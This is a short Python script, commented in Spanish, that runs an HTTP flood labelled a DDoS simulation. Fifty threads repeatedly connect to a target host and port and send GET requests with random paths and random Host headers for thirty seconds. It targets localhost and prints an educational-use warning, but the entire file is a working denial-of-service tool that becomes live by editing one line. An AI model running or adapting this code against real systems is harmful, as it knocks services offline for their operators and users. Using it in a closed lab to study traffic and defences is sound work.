import threading
import socket
import random
import time

# Configuración
target_host = "127.0.0.1"
target_port = 80
num_threads = 50
attack_duration = 30  # segundos

def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def send_packets():
    end_time = time.time() + attack_duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_host, target_port))
            s.sendto(("GET /" + str(random.randint(0, 2000)) + " HTTP/1.1\r\n").encode('ascii'), (target_host, target_port))
            s.sendto(("Host: " + generate_random_ip() + "\r\n\r\n").encode('ascii'), (target_host, target_port))
            s.close()
        except:
            pass

def start_attack():
    thread_list = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_packets)
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

if __name__ == "__main__":
    print(f"Iniciando simulación de ataque DDoS en {target_host}:{target_port}")
    print(f"Duración: {attack_duration} segundos")
    print("ADVERTENCIA: Este script es solo para fines educativos en un entorno controlado.")
    start_attack()
    print("Simulación completada. Verifique la captura en Wireshark.")